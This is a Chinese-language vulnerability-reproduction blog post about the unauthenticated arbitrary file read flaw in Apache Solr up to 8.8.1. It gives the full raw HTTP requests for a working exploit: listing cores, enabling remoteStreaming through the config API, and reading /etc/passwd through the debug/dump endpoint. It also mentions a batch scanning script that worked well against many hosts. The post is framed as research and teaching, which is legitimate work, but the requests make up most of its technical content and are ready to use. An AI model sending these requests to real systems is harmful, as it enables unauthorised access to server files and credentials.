![v2-aa4e5f987ddcf0dbfaadf67c8a54ed02_1440w.png](https://image.3001.net/images/20210318/1616057952_605316600b68c745c61da.png!small)

​Apache Solr任意文件读取漏洞复现

一、简介

Solr是一个独立的企业级搜索应用服务器，它对外提供类似于Web-service的API接口。用户可以通过http请求，向搜索引擎服务器提交一定格式的XML文件，生成索引；也可以通过Http
Get操作提出查找请求，并得到XML格式的返回结果。

Apache-Solr任意文件读取漏洞漏洞，攻击者可以在未授权的情况下读取目标服务器敏感文件和相关内容。

二、影响版本

Apache Solr <= 8.8.1

三、漏洞复现

安装：

Solr下载地址：自行下载对应满足版本http://archive.apache.org/dist/lucene/solr/

![v2-22376c29eef33b18485f664a81033071_1440w.png](https://image.3001.net/images/20210318/1616057952_60531660d6dcaea58e2e1.png!small)

访问页面

![v2-8c75a88b47c5013b0558aa5ea596d06e_1440w.png](https://image.3001.net/images/20210318/1616057953_6053166180be1ac3c00f8.png!small)

第一步：获取core的信息：主要是name

http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&wt=json

![v2-50dcd51af28a552982a67c5909103235_1440w.png](https://image.3001.net/images/20210318/1616057954_6053166233509276c14c0.png!small)

详细数据包

GET /solr/admin/cores?indexInfo=false&wt=json HTTP/1.1 Host: 127.0.0.1:8983
Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS
X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.67
Safari/537.36 Edg/87.0.664.52 Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6 Connection: close

第二步：判断是否存在漏洞:返回200并且包含This response format is experimental. It is likely to
change in the future 可能存在，需要进一步的去读取/etc/passwd或者其他进行确认最终是否存在读取漏洞

![v2-558607f9e66d38604fbedc1be4f1b0da_1440w.png](https://image.3001.net/images/20210318/1616057954_60531662b036ef7039ede.png!small)

详细数据包：

POST /solr/tesla/config HTTP/1.1 Host: 127.0.0.1:8983 Content-Length: 80
Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin:
http://127.0.0.1:8983 Content-Type: application/json User-Agent: Mozilla/5.0
(Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Chrome/89.0.4389.82 Safari/537.36 Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://127.0.0.1:8983/solr/tesla/config Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close ​ {"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}

第三步：读取文件/etc/passwd:

![v2-43b3d7807343d95d6d9322bf54b74c14_1440w.png](https://image.3001.net/images/20210318/1616057955_605316636e8a52557ac1a.png!small)

详细数据包：

POST /solr/tesla/debug/dump?param=ContentStreams HTTP/1.1 Host: 127.0.0.1:8983
Content-Length: 29 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:8983 Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://127.0.0.1:8983/solr/tesla/config Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close ​
stream.url=file:///etc/passwd

编写检测脚本：

显示读取内容：

![v2-f859f6533325a80f087940ac680cf175_1440w.png](https://image.3001.net/images/20210318/1616057956_60531664ab818a554644c.png!small)

直接跑存在不现实读取内容：

批量出来效果还是不错的

![v2-98176ca5f1693f44059c71e4da5a137d_1440w.png](https://image.3001.net/images/20210318/1616057957_60531665b297d23a8cf27.png!small)

参考：

https://mp.weixin.qq.com/s/5U04Qhr_KBCznAbXe9jEeg

免责声明：本站提供安全工具、程序(方法)可能带有攻击性，仅供安全研究与教学之用，风险自负!

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

![v2-2fd29902f9e696422dbb34fe44673324_1440w.jpg](https://image.3001.net/images/20210318/1616057958_60531666f2185a3810243.jpg!small)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html

个人博客园：https://www.cnblogs.com/thelostworld/

FREEBUF主页：https://www.freebuf.com/author/thelostworld?type=article

语雀博客主页：https://www.yuque.com/thelostworld

![v2-78d9eafd98f5028012b040523e959eda_1440w.png](https://image.3001.net/images/20210318/1616057959_605316678857332f2b5c0.png!small)

欢迎添加本公众号作者微信交流，添加时备注一下“公众号”

![v2-5418cb38719b324ae20f5ca63fc1eaff_1440w.png](https://image.3001.net/images/20210318/1616057959_60531667e0d664ba3ed88.png!small)

